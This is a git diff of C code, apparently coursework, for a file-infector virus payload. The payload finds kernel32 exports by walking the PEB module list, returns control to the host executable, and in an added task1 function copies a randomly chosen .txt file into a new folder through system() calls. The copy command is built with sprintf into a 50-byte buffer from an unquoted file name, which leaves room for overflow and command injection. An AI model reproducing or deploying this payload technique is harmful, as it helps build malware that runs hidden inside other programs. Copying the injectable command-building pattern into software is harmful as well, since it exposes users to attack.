@@ -25,13 +25,15 @@ void *get_image_base(wchar_t *module_name, LIST_ENTRY *list) SET_SECT;
 IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base) SET_SECT;
 void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, void *image_base) SET_SECT;
 
-// ==========
+void task1(tGetProcAddress pGetProcAddress, HMODULE msvcrt_hModule, IMAGE_EXPORT_DIRECTORY *i_ex_dir, void* image_base) SET_SECT;
+
 int compare(const char* a, const char* b) SET_SECT;
 size_t length(const char* str) SET_SECT;
 int wcompare(const wchar_t *a, const wchar_t *b) SET_SECT;
+int match_suffix(char *str, char* suffix) SET_SECT;
 
-// ==========
 #define FUNCTION(name) ((t_##name)pGetProcAddress(msvcrt_hModule, s_##name))
+#define K32_FUNCTION(name) ((t##name)get_kernel_32_func(s##name, i_ex_dir, image_base))
 #define LOAD(name) t##name p##name = (t##name)get_kernel_32_func(s##name, i_ex_dir, image_base)
 
 int main()
@@ -41,31 +43,24 @@ int main()
 }
 
 void payload(void)
-{
-    // asm ("start_label:");
-
-    char sLoadLibraryA[] = "LoadLibraryA";
-    char sGetProcAddress[] = "GetProcAddress";
-    char sFreeLibrary[] = "FreeLibrary";
-    
-    // FindFirstFileA
-    // FindNextFileA
-    // FindClose
-    const char message[] = "This is the payload!!!!!!!!!!!!!!!!!!!!!!!!\n"; // !: 0x21 
-    wchar_t kernel_32_name[] = L"KERNEL32.DLL";
-    
+{    
     // get_InMemoryOrderModuleList
     LIST_ENTRY *list = 0;
-
     {
         PEB *peb = 0; 
         asm volatile ("movq %%gs:0x60, %0":"=r" (peb));
         list = &(peb->Ldr->InMemoryOrderModuleList);
     }
     
+    wchar_t kernel_32_name[] = L"KERNEL32.DLL";
     void *image_base = get_image_base(kernel_32_name, list);
 
     IMAGE_EXPORT_DIRECTORY *i_ex_dir = get_IMAGE_EXPORT_DIRECTORY(image_base);
+
+    // load base funcs
+    char sLoadLibraryA[] = "LoadLibraryA";
+    char sGetProcAddress[] = "GetProcAddress";
+    char sFreeLibrary[] = "FreeLibrary";
 
     LOAD(LoadLibraryA);
     LOAD(GetProcAddress);
@@ -77,26 +72,43 @@ void payload(void)
 
 
 // do sth.
-    // test
-    typedef int (*t_puts)(const char *);
-    char s_puts[] = "puts";
-    typedef int (*t_printf) (const char *, ...);
-    char s_printf[] = "printf";
+typedef int (*t_puts)(const char *);
+char s_puts[] = "puts";
+typedef int (*t_printf) (const char *, ...);
+char s_printf[] = "printf";
+const char empty_str[] = ""; 
 
-    char msg[] = "_|Hallo|_";
-    FUNCTION(puts)(msg);
+    // test
+    {
+        char msg[] = "_|Hallo|_\n";
+        FUNCTION(puts)(msg);
+    }
+
+    task1(pGetProcAddress, msvcrt_hModule, i_ex_dir, image_base);
 
     // ===========================================
+    #if 0
     // File 
+
+
+// typedef FILE *(*t_fopen)(const char *,const char *);
+// typedef size_t (*t_fwrite)(const void *, size_t, size_t, FILE *);
+// char s_fopen[] = "fopen";
+// char s_fwrite[] = "fwrite";
+
+// char mode[] = "w";
+// FILE* got = FUNCTION(fopen)(dest_path, mode);
+
+
 
     // GetModuleFileNameW
     typedef FILE *(*t_fopen)(const char *,const char *);
-    char s_fopen[] = "fopen";
     typedef size_t (*t_fread)(void *, size_t, size_t, FILE *);
-    char s_fread[] = "fread";
     typedef int (*t_fseek)(FILE *, long, int);
-    char s_fseek[] = "fseek";
     typedef int (*t_fclose)(FILE *);
+    char s_fopen[] = "fopen";
+    char s_fread[] = "fread";
+    char s_fseek[] = "fseek";
     char s_fclose[] = "fclose";
 
     char host_name[] = EXE_FILE_NAME; 
@@ -114,6 +126,7 @@ void payload(void)
 
     FUNCTION(fclose)(host);
     // End file
+    #endif
     // ===========================================
 
     //  calculating in-file offset of instruction mov /(rva)/, %%rax
@@ -129,13 +142,16 @@ void payload(void)
     );
 
     offset += 3;
-    char format[] = "offset: %X\n"; 
-    FUNCTION(printf)(format, offset);
+    // char format[] = "offset: %X\n"; 
+    // FUNCTION(printf)(format, offset);
 
     pFreeLibrary(msvcrt_hModule);
 // done
 
 // go back to host code
+    char back_msg[] = "Going back...";
+    FUNCTION(puts)(back_msg);
+
     list = list->Flink;
     void *current_image_base = *((void**)((void*)list + 0x20));
 
@@ -175,6 +191,8 @@ void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, 
         // puts((char*)(name_table[serial]+image_base));
         if(compare((char*)(name_table[serial]+image_base), function_name) == 0)
         {
+            // printf("%s GOT\n", function_name);
+            // printf("req: %s \n", (char*)(name_table[serial]+image_base));
             break;
         }
     }
@@ -201,6 +219,66 @@ void *get_image_base(wchar_t *module_name, LIST_ENTRY *list)
         }
         list = list->Flink;
     }
+}
+
+void task1(tGetProcAddress pGetProcAddress, HMODULE msvcrt_hModule, IMAGE_EXPORT_DIRECTORY *i_ex_dir, void* image_base)
+{
+
+// typedef int (*t_puts)(const char *);
+// char s_puts[] = "puts";
+// const char empty_str[] = ""; 
+
+    typedef HANDLE (*tFindFirstFileA) (LPCSTR, LPWIN32_FIND_DATAA);
+    typedef WINBOOL (*tFindNextFileA) (HANDLE, LPWIN32_FIND_DATAA);
+    typedef WINBOOL (*tFindClose) (HANDLE);
+    char sFindFirstFileA[] = "FindFirstFileA";
+    char sFindNextFileA[] = "FindNextFileA";
+    char sFindClose[] = "FindClose";
+
+    typedef void (*t_srand)(unsigned int);
+    typedef int (*t_rand)(void);
+    typedef time_t (*t_time)(time_t *);
+    char s_srand[] = "srand";
+    char s_rand[] = "rand";
+    char s_time[] = "time";
+
+    typedef char *(*t_strcpy)(char *, const char *);
+    char s_strcpy[] = "strcpy";
+
+    typedef int(*t_system)(LPCSTR);
+    typedef int(*t_sprintf)(char *, const char *,...);
+    char s_system[] = "system";
+    char s_sprintf[] = "sprintf";
+    
+    WIN32_FIND_DATA findFileData;
+    char param[] = "*.*"; 
+    HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
+
+    char suffix[] = ".txt";
+    char txt_file_name[MAX_PATH];
+    FUNCTION(srand)(FUNCTION(time)(NULL));
+    do 
+    {
+        // FUNCTION(puts)(findFileData.cFileName);
+        if (match_suffix(findFileData.cFileName, suffix))
+        {
+            FUNCTION(strcpy)(txt_file_name, findFileData.cFileName);
+            if(FUNCTION(rand)()%2)
+            {
+                break;
+            } 
+        }
+    } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
+    K32_FUNCTION(FindClose)(hFind);
+
+    char mkdir_cmd[] = "mkdir v_folder";
+    FUNCTION(system)(mkdir_cmd);
+
+    char cpy_cmd[50];
+    char cpy_fomat[] = "copy %s %s > NUL";
+    char dest_path[] = ".\\v_folder\\2021302181087.txt";
+    FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
+    FUNCTION(system)(cpy_cmd);
 }
 
 #include "string.c"
